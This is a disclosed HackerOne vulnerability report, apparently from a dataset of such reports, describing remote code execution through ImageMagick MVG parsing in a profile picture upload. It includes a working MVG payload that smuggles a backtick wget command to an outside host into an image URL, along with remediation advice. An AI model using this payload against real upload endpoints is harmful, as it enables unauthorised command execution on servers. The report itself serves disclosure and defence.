---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '135072'
original_report_id: '135072'
title: RCE in profile picture upload
weakness: Code Injection
team_handle: security
created_at: '2016-04-27T22:04:28.937Z'
disclosed_at: '2016-06-08T10:14:12.350Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 30
tags:
- hackerone
- code-injection
---

# RCE in profile picture upload

## Metadata

- HackerOne Report ID: 135072
- Weakness: Code Injection
- Program: security
- Disclosed At: 2016-06-08T10:14:12.350Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Issue
=====
The profile picture upload at /settings/profile/edit is vulnerable to remote code execution due to the uploaded file being passed to ImageMagick without checking whether it's an actual image. Combined with the fact that ImageMagick parses ASCII text as so called MVG (Magic Vector Graphics), this enables an attacker to trigger a newly discovered vulnerability in MVG parsing which allows for command injection.

Steps to reproduce
======
Upload the following ASCII file as **x.gif** using the regular profile picture upload flow:
```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 1.2.3.4:1337 > /dev/null`'
pop graphic-context
```
This executes the `wget` command and makes an HTTP request to 1.2.3.4 on port 1337.

Technical details
======
The "image" directive in MVG allows for the usage of so called "delegates" which are somewhat similar to a protocol specifier in a URL: a colon-seperated (delegate,argument)-pair like e.g. "label:SomeText" can be specified, invoking the respective delegate handler. Custom delegates can be added as a bash-call with substitute variables in /etc/ImageMagick/delegates.xml. The handler for https-URLs uses a bash command to invoke curl which suffers from the command injection vulnerability.

Recommendation
======
A simple fix is to check the magic values of the uploaded files and whitelist those, i.e. to only allow JPEG, GIF and PNG uploads before passing the file to ImageMagick (e.g. the `convert` utility).
Also, servers that do image processing should not be able to establish outbound network connections.
This vulnerability will be reported to ImageMagick within the next 72 hours as a detailed advisory about this and several other MVG issues is currently being drafted.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
